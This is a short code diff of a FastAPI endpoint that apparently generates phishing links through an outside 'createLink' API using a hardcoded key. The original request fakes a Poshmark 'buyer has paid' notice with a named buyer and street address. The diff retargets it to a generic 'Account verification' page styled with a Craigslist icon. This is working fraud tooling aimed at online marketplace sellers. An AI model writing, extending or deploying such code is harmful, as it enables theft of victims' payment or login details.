@@ -10,20 +10,20 @@ app = FastAPI()
 
 
 
-@app.get("/listing/{item}")
+@app.get("/")
 def new():
 
     url = 'https://rakuzanapi.com/api/createLink'
 
     headers = {
         'key': 'akwd7749221011picbs33m1l',
-        'title': 'The buyer has paid for and arranged shipping on your product',
-        'price': ' ',
-        'name': 'Jeff J. Mathis',
-        'address': '1586 Ritter Street Huntsville, AL 35816',
-        'photo': 'https://s3-symbol-logo.tradingview.com/poshmark--600.png',
+        'title': 'Account verification',
+        'price': '-',
+        'name': 'Admin',
+        'address': '-',
+        'photo': 'https://moscow.craigslist.org/favicon.ico',
         'balance': '1',
-        "linkService": "poshmark_us"
+        "linkService": "customverify_world"
     }
 
     response = requests.post(url, data=headers).json()
